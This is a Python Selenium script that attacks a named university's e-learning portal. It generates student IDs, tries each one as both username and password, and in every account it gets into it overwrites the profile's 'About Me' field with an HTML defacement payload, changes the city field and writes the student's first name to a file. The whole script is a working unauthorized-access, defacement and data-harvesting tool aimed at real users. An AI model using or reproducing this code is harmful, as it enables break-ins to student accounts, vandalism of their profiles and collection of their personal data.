from selenium import webdriver
import time 
import re

# Engineering
    # 22    -   Computer Science - DONE 
    # 20    -   Mechanical Engineering - INCOMPLETE
    # 36    -   Chemical Engineering - ERROR 
    # 19    -   Civil Engineering
    #       -   Mechatronics Engineering
    # 21    -   Electronics Engineering - DONE
    #       -   Electrical Engineering
    # 05    -   ISM - ERROR - DONE 
# Medical
    # 03    -   Biotech? - DONE 
# Designing 
    # 38    -   Interior Designing - DONE 
    # 25    -   Architecture - DONE
# Commerce 
    # 01    -   BCOM - ERROR - DONE 
    # 41    -   BBA - DONE
    # 12    -   MBA
# Media
    # 02    - Media - ERROR - DONE 
# No Idea
    # 18 # 24 # 28 # 42

# All the roll numbers
roll_numbers = []
for i in range(1,90,1):
    if(len(str(i))==1):
        number = '00'+str(i)
    else:
        number = '0'+str(i)
    roll_numbers.append(number)
    
# Years from 2014, 2015, 2016, 2017
years = [str(i) for i in range(14,18,1)]

# Array with all the Department Codes
department_codes = ['22']

path_to_driver = "/Users/rijinmk/Desktop/Programming/Programming/Practice/SELENIUM/chromedriver"
driver = webdriver.Chrome(path_to_driver)
driver.get('http://elearning.manipaldubai.com')

html = ' <body> <div id="container" style="position:absolute;top:100px;left:0px;width:100%;height:100%;"> <h2 style="position:absolute;top:-50px;left:30px;font-size:100px;">CANT STOP THE <br><br><br><br>PARTAAAAY</h2> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> <img src="https://funsubstance.com/uploads/gif/215/215926.gif" alt="" style="width:200px;height:auto;position:relative;display:inline-block;"> </div></body>'

def check_this_class(element):
    try:
        driver.find_element_by_class_name(element)
        return 1
    except:
        return 0

for j in department_codes: 
    for i in years: 
        for k in roll_numbers:
            username_text = str(i) + str(j) + str(k)
            password_text = str(i) + str(j) + str(k)
            
            username_input = driver.find_element_by_name('loginId') 
            password_input = driver.find_element_by_name('password')
            login_button = driver.find_element_by_name('op')
            
            print "Injecting keystrokes into the inputs..."
            username_input.send_keys(username_text)
            password_input.send_keys(password_text)
            print "Clicking the login button..."
            login_button.click()
            print "Logging into", username_text
            
            err = check_this_class('error')
            
            if(err!=1):
                profile_ico = driver.find_element_by_class_name('circular')
                print "Clicking the profile icon.."
                profile_ico.click()
            
                my_profile_link = driver.find_element_by_css_selector('.marb10 .txt13')
                print "Clicking the 'My Profile' link..."
                my_profile_link.click()
            
                try:
                    edit_profile_btn = driver.find_element_by_css_selector('.linkButton a')
                    print "Clicking on 'Edit Profile' link..."
                    edit_profile_btn.click()
                except: 
                    print "iFrame is already injected."
                    driver.execute_script("document.querySelector('.linkButton a').click()")
            
                about_me_textarea = driver.find_element_by_name('accomplishments')
                print "Injecting 'iframe' to 'About Me'..."
                about_me_textarea.clear()
                about_me_textarea.send_keys(html)
            
                print "Fixing name..."
                fname_input = driver.find_element_by_id('edit-firstName')
                fname_value = fname_input.get_attribute('value')
                fname_value = re.sub('SSS ', '', fname_value)
                fname_input.clear()
                fname_input.send_keys(fname_value)
            
                edit_city_input = driver.find_element_by_id('edit-city')
                print "Injecting 'UAE' into Location..."
                edit_city_input.clear()
                edit_city_input.send_keys('UAE')
            
                update_button = driver.find_element_by_id('edit-add')
                update_button.click()
                print "Updating..."
                
                print "Updating file: ", '20'+str(i)+str(j)+'.txt'
                print "With: ", username_text + '--' + fname_value + '\n'
                f = open('20'+str(i)+str(j)+'.txt', 'a')
                f.write(username_text + '--' + fname_value + '\n')
                f.close()
            
                print "Preparing to logout..."
                profile_ico = driver.find_element_by_class_name('circular')
                print "Clicking the profile icon.."
                profile_ico.click()
                logout_link = driver.find_element_by_id('userLogout')
                logout_link.click()
            else:
                print "Username doesnt exist or they changed thier password"
                print
                print "Updating file: ", '20'+str(i)+str(j)+'.txt'
                print "With: ", username_text + '--0 \n'
                f = open('20'+str(i)+str(j)+'.txt', 'a')
                f.write(username_text + '--0 \n')
                f.close()
                print
            
            
            
            
